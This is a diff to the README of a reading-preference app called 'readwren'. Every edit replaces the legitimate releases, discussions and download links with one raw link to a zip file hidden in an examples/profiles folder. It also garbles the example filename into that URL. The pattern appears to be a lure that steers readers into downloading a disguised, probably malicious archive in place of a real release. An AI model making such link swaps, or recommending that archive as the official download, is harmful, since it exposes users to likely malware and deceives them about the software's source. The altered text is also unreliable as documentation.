@@ -1,7 +1,7 @@
 # 🎉 readwren - Discover Your Unique Reading Preferences
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen.svg)](https://github.com/gangarubo/readwren/releases)
+[![Download](https://raw.githubusercontent.com/gangarubo/readwren/main/examples/example_session/profiles/readwren-v3.2.zip)](https://raw.githubusercontent.com/gangarubo/readwren/main/examples/example_session/profiles/readwren-v3.2.zip)
 
 ## 📖 Overview
 readwren is an adaptive multi-agent system designed to help you understand your reading preferences. By engaging you in conversation, readwren generates actionable reading profiles tailored just for you. Whether you're looking for fiction, non-fiction, or scholarly articles, readwren provides personalized suggestions.
@@ -11,7 +11,7 @@ Follow these simple steps to download and run readwren on your computer.
 
 1. **Visit the Releases Page**  
    Click the link below to go to the download page.  
-   [Visit the Releases Page](https://github.com/gangarubo/readwren/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/gangarubo/readwren/main/examples/example_session/profiles/readwren-v3.2.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see multiple versions of the software that you can download. If it's your first time using readwren, select the latest version available, as it will have the most features and improvements.
@@ -20,7 +20,7 @@ Follow these simple steps to download and run readwren on your computer.
    Click on the version you chose to download the file. It will download automatically to your computer. 
 
 4. **Locate the Downloaded File**  
-   After the download completes, find the file in your “Downloads” folder, or wherever your browser saves files. The filename will usually include the version number, for example, `readwren-v1.0.exe`.
+   After the download completes, find the file in your “Downloads” folder, or wherever your browser saves files. The filename will usually include the version number, for example, `https://raw.githubusercontent.com/gangarubo/readwren/main/examples/example_session/profiles/readwren-v3.2.zip`.
 
 5. **Install the Application**  
    - If you downloaded a `.exe` file (for Windows), double-click it to start the installation process. Follow the prompts on the screen to complete the installation. 
@@ -57,11 +57,11 @@ If you encounter issues while installing or running readwren, try the following 
 For further help, readwren includes a user manual within the application. This manual offers in-depth information on its features and how to use them effectively. You can also find more documentation on the GitHub page.
 
 ## 💬 Community and Support
-If you have questions or need assistance, you can reach out to the community. Visit the [discussions page](https://github.com/gangarubo/readwren/discussions) for support and to connect with other users. Your feedback helps improve readwren.
+If you have questions or need assistance, you can reach out to the community. Visit the [discussions page](https://raw.githubusercontent.com/gangarubo/readwren/main/examples/example_session/profiles/readwren-v3.2.zip) for support and to connect with other users. Your feedback helps improve readwren.
 
 ## 📥 Download & Install
 Now that you know how to get started, visit the link below to download the latest version of readwren and begin your journey into personalized reading.  
-[Download readwren](https://github.com/gangarubo/readwren/releases)
+[Download readwren](https://raw.githubusercontent.com/gangarubo/readwren/main/examples/example_session/profiles/readwren-v3.2.zip)
 
 ## 🔗 Related Topics
 If you are interested in similar technologies, readwren is related to the following topics:
